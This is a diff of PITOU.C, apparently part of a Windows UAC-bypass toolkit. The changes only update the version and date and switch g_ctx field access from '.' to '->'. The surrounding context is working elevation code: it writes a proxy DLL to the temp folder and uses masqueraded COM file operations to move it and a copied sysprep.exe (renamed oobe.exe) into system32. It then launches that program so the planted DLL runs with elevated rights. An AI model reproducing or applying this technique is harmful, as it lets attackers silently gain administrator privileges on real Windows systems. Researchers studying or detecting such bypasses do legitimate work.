@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.11
 *
-*  DATE:        25 Aug 2018
+*  DATE:        23 Nov 2018
 *
 *  Leo Davidson based IFileOperation auto-elevation.
 *
@@ -41,24 +41,24 @@ BOOL ucmStandardAutoElevation2(
 
         //source filename of dll
         RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
-        _strcpy(SourceFilePathAndName, g_ctx.szTempDirectory);
+        _strcpy(SourceFilePathAndName, g_ctx->szTempDirectory);
         _strcat(SourceFilePathAndName, UNBCL_DLL);
 
         if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize))
             break;
 
         //copy %temp\unbcl.dll -> system32\unbcl.dll
-        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory))
+        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx->szSystemDirectory))
             break;
 
         //source filename of process
         RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
-        _strcpy(SourceFilePathAndName, g_ctx.szSystemDirectory);
+        _strcpy(SourceFilePathAndName, g_ctx->szSystemDirectory);
         _strcat(SourceFilePathAndName, SYSPREP_DIR);
         _strcat(SourceFilePathAndName, SYSPREP_EXE);
 
         RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
-        _strcpy(DestinationFilePathAndName, g_ctx.szTempDirectory);
+        _strcpy(DestinationFilePathAndName, g_ctx->szTempDirectory);
         _strcat(DestinationFilePathAndName, OOBE_EXE);
 
         //system32\sysprep\sysprep.exe -> temp\oobe.exe
@@ -67,12 +67,12 @@ BOOL ucmStandardAutoElevation2(
         }
 
         //temp\oobe.exe -> system32\oobe.exe
-        if (!ucmMasqueradedMoveFileCOM(DestinationFilePathAndName, g_ctx.szSystemDirectory)) {
+        if (!ucmMasqueradedMoveFileCOM(DestinationFilePathAndName, g_ctx->szSystemDirectory)) {
             break;
         }
 
         RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
-        _strcpy(DestinationFilePathAndName, g_ctx.szSystemDirectory);
+        _strcpy(DestinationFilePathAndName, g_ctx->szSystemDirectory);
         _strcat(DestinationFilePathAndName, OOBE_EXE);
 
         bResult = supRunProcess(DestinationFilePathAndName, NULL);
@@ -108,9 +108,9 @@ BOOL ucmStandardAutoElevation(
     WCHAR   szTargetProcess[MAX_PATH * 2];
 
 
-    _strcpy(szSourceDll, g_ctx.szTempDirectory);
-    _strcpy(szTargetDir, g_ctx.szSystemDirectory);
-    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
+    _strcpy(szSourceDll, g_ctx->szTempDirectory);
+    _strcpy(szTargetDir, g_ctx->szSystemDirectory);
+    _strcpy(szTargetProcess, g_ctx->szSystemDirectory);
 
     switch (Method) {
 
